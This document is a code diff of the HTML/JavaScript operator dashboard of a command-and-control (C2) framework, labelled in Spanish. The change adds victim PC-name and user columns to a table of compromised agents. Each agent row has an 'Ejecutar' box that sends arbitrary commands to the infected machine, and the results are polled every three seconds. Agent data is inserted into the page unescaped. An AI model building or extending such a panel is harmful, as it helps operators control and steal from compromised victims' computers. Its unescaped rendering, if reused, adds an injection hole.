@@ -3,18 +3,20 @@
 <head>
     <title>C2 Framework Dashboard</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
-<div class="d-flex justify-content-between align-items-center">
-    <h1>C2 Panel Dashboard <span class="badge bg-success" style="font-size: 0.5em;">Real-Time</span></h1>
-    <a href="/logout" class="btn btn-outline-warning">Cerrar Sesión</a>
-</div>
 </head>
 <body class="bg-dark text-white p-5">
-    <h1>C2 Panel Dashboard <span class="badge bg-success" style="font-size: 0.5em;">Real-Time</span></h1>
     
+    <div class="d-flex justify-content-between align-items-center mb-4">
+        <h1>C2 Panel Dashboard <span class="badge bg-success" style="font-size: 0.5em;">Real-Time</span></h1>
+        <a href="/logout" class="btn btn-outline-warning">Cerrar Sesión</a>
+    </div>
+
     <table class="table table-dark table-striped mt-4">
         <thead>
             <tr>
                 <th>ID</th>
+                <th>PC Name</th>
+                <th>Usuario</th>
                 <th>IP Víctima</th>
                 <th>Última Respuesta</th>
                 <th>Acción</th>
@@ -25,67 +27,64 @@
     </table>
 
     <script>
-    // Función para pedir los datos al servidor sin destruir lo que escribes
     async function actualizarAgentes() {
-        const response = await fetch('/api/agentes');
-        const agentes = await response.json();
-        const tabla = document.getElementById('tabla-agentes');
+        try {
+            const response = await fetch('/api/agentes');
+            const agentes = await response.json();
+            const tabla = document.getElementById('tabla-agentes');
 
-        agentes.forEach(agente => {
-            // Intentamos buscar si ya existe una fila para este agente
-            let filaExistente = document.getElementById(`fila-${agente.id}`);
+            agentes.forEach(agente => {
+                let filaExistente = document.getElementById(`fila-${agente.id}`);
 
-            if (filaExistente) {
-                // SI YA EXISTE: Solo cambiamos el texto del resultado
-                // Buscamos la etiqueta <pre> dentro de esa fila
-                const celdaRespuesta = filaExistente.querySelector('.respuesta-text');
-                
-                // Solo actualizamos si el texto ha cambiado para no parpadear
-                if (celdaRespuesta.innerText !== agente.resultado) {
-                    celdaRespuesta.innerText = agente.resultado;
+                if (filaExistente) {
+                    // Actualizar respuesta si cambia
+                    const celdaRespuesta = filaExistente.querySelector('.respuesta-text');
+                    if (celdaRespuesta.innerText !== agente.resultado) {
+                        celdaRespuesta.innerText = agente.resultado;
+                    }
+                } else {
+                    // CREAR FILA NUEVA CON LAS 6 COLUMNAS
+                    const nuevaFila = `
+                        <tr id="fila-${agente.id}">
+                            <td>${agente.id}</td>
+                            <td class="text-warning fw-bold">${agente.pc}</td>
+                            <td class="text-success">${agente.user}</td>
+                            <td>${agente.ip}</td>
+                            <td><pre class="text-info respuesta-text">${agente.resultado}</pre></td>
+                            <td>
+                                <div class="input-group">
+                                    <input type="text" id="cmd-${agente.id}" class="form-control" placeholder="Escribe un comando...">
+                                    <button class="btn btn-danger" onclick="enviarComando(${agente.id})">Ejecutar</button>
+                                </div>
+                            </td>
+                        </tr>
+                    `;
+                    tabla.insertAdjacentHTML('beforeend', nuevaFila);
                 }
-            } else {
-                // SI ES NUEVO: Creamos la fila por primera vez
-                const nuevaFila = `
-                    <tr id="fila-${agente.id}">
-                        <td>${agente.id}</td>
-                        <td>${agente.ip}</td>
-                        <td><pre class="text-info respuesta-text">${agente.resultado}</pre></td>
-                        <td>
-                            <div class="input-group">
-                                <input type="text" id="cmd-${agente.id}" class="form-control" placeholder="Escribe un comando...">
-                                <button class="btn btn-danger" onclick="enviarComando(${agente.id})">Ejecutar</button>
-                            </div>
-                        </td>
-                    </tr>
-                `;
-                // Lo añadimos al final de la tabla sin borrar lo anterior
-                tabla.insertAdjacentHTML('beforeend', nuevaFila);
-            }
-        });
+            });
+        } catch (error) {
+            console.error("Error cargando agentes:", error);
+        }
     }
 
-    // Función para enviar comandos vía AJAX (se mantiene igual)
     async function enviarComando(id) {
         const inputCmd = document.getElementById(`cmd-${id}`);
         const cmd = inputCmd.value;
-        
-        if (!cmd) return; // No enviar si está vacío
+
+        if (!cmd) return;
 
         const formData = new FormData();
         formData.append('id', id);
         formData.append('comando', cmd);
 
-        // Limpiamos el input justo después de enviar para comodidad
-        inputCmd.value = ''; 
+        inputCmd.value = ''; // Limpiar tras enviar
 
         await fetch('/ejecutar', { method: 'POST', body: formData });
-        actualizarAgentes(); 
+        actualizarAgentes();
     }
 
-    // Actualizamos cada 3 segundos de forma fluida
     setInterval(actualizarAgentes, 3000);
-    actualizarAgentes(); // Carga inicial
-</script>
+    actualizarAgentes();
+    </script>
 </body>
 </html>
